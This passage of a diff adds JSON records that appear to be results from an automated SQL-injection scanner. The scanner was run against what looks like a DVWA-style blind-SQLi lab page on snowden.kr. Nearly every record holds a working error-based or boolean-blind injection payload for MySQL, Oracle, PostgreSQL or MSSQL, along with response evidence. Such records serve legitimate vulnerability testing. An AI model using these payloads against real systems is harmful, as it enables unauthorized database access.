+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e FROM DUAL WHERE 1=1 OR ERROR(CONCAT(0x5356534441414141,(SELECT (CASE WHEN (1=1) THEN '1' ELSE '0' END)),0x5641534441414141)) IS NOT NULL )||'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0256,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e FROM DUAL WHERE 1=1 AND ERROR(CONCAT(0x5356534441414141,(SELECT (CASE WHEN (1=1) THEN '1' ELSE '0' END)),0x5641534441414141)) IS NOT NULL )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0189,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e FROM DUAL WHERE 1=1 AND GTID_SUBSET(CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0198,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT CHR(118)||CHR(117)||CHR(110) FROM DUAL WHERE 1=1 AND 1=UTL_INADDR.GET_HOST_ADDRESS(CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END) FROM DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0226,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e FROM DUAL WHERE 1=1 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141)) USING utf8))) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0216,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e FROM DUAL WHERE 1=1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141,FLOOR(RAND(0)*2))x FROM (SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5)a GROUP BY x) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0196,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 'v' + 'u' + 'n' FROM DUAL WHERE 1=1 OR 1=('S' + 'V' + 'S' + 'D' + 'A' + 'A' + 'A' + 'A'||(CASE WHEN (1=1) THEN '1' ELSE '0' END)||'V' + 'A' + 'S' + 'D' + 'A' + 'A' + 'A' + 'A') )||'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0158,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e FROM DUAL WHERE 1=1 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141,'x'))x)) )||'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0319,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e FROM DUAL WHERE 1=1 OR EXTRACTVALUE(1,CONCAT('\\',0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141)) )||'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0299,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e WHERE 1=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141,'x'))s), 8446744073709551610, 8446744073709551610))) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0258,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 'v' + 'u' + 'n' WHERE 1=1 AND 1=1 )||'",
+        "type": "SQLi-boolean_blind",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0254,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 'v' + 'u' + 'n' WHERE 1=1 AND 1=(SELECT (CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)) )||'",
+        "type": "SQLi-boolean_blind",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0281,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 'v' + 'u' + 'n' WHERE 1=1 AND 1=('S' + 'V' + 'S' + 'D' + 'A' + 'A' + 'A' + 'A'||(CASE WHEN (1=1) THEN '1' ELSE '0' END)||'V' + 'A' + 'S' + 'D' + 'A' + 'A' + 'A' + 'A') )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0259,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT CHR(118)||CHR(117)||CHR(110) WHERE 1=1 AND 1=CAST(CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END))::text||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65) AS NUMERIC) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0259,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT CHR(118)||CHR(117)||CHR(110) WHERE 1=1 AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END) FROM DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||CHR(62))) FROM DUAL) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0242,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 'v' + 'u' + 'n' FROM DUAL WHERE 1=1 OR NOT 1=1 )||'",
+        "type": "SQLi-boolean_blind",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0176,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e WHERE 1=1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0195,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e FROM DUAL WHERE 1=1 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141)) USING utf8))) )||'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0225,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e WHERE 1=1 AND 1 IN (SELECT (0x5356534441414141+(SELECT (CASE WHEN (1=1) THEN '1' ELSE '0' END))+0x5641534441414141)) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0258,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e FROM DUAL WHERE 1=1 OR ROW(1,1)>(SELECT COUNT(*),CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141,FLOOR(RAND(0)*2))x FROM (SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5)a GROUP BY x) )||'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0247,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e FROM DUAL WHERE 1=1 OR GTID_SUBSET(CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) )||'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0243,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT CHR(118)||CHR(117)||CHR(110) WHERE 1=1 AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END) FROM DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65))) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0119,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e FROM DUAL WHERE 1=1 OR UPDATEXML(1,CONCAT('.',0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) )||'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0186,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT CHR(118)||CHR(117)||CHR(110) WHERE 1=1 AND 1=UTL_INADDR.GET_HOST_ADDRESS(CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END) FROM DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0222,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT CHR(118)||CHR(117)||CHR(110) WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,(CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END) FROM DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65))) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0239,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e WHERE 1=1 AND ERROR(CONCAT(0x5356534441414141,(SELECT (CASE WHEN (1=1) THEN '1' ELSE '0' END)),0x5641534441414141)) IS NOT NULL )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0233,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e WHERE 1=1 AND 1=CONCAT(0x5356534441414141,(SELECT (CASE WHEN (1=1) THEN '1' ELSE '0' END)),0x5641534441414141) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0251,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e WHERE 1=1 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141,'x'))x)) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.022,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e WHERE 1=1 AND 1=CONVERT(INT,(SELECT 0x5356534441414141+(SELECT (CASE WHEN (1=1) THEN '1' ELSE '0' END))+0x5641534441414141)) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0248,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 'v' + 'u' + 'n' WHERE 1=1 OR 1=('S' + 'V' + 'S' + 'D' + 'A' + 'A' + 'A' + 'A'||(CASE WHEN (1=1) THEN '1' ELSE '0' END)||'V' + 'A' + 'S' + 'D' + 'A' + 'A' + 'A' + 'A') )||'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0092,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e WHERE 1=1 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141)) USING utf8))) )||'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0096,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e WHERE 1=1 OR GTID_SUBSET(CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) )||'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.008,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e WHERE 1=1 AND EXTRACTVALUE(1,CONCAT('\\',0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141)) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0132,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e WHERE 1=1 OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) )||'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0119,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e WHERE 1=1 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141)) USING utf8))) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0181,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
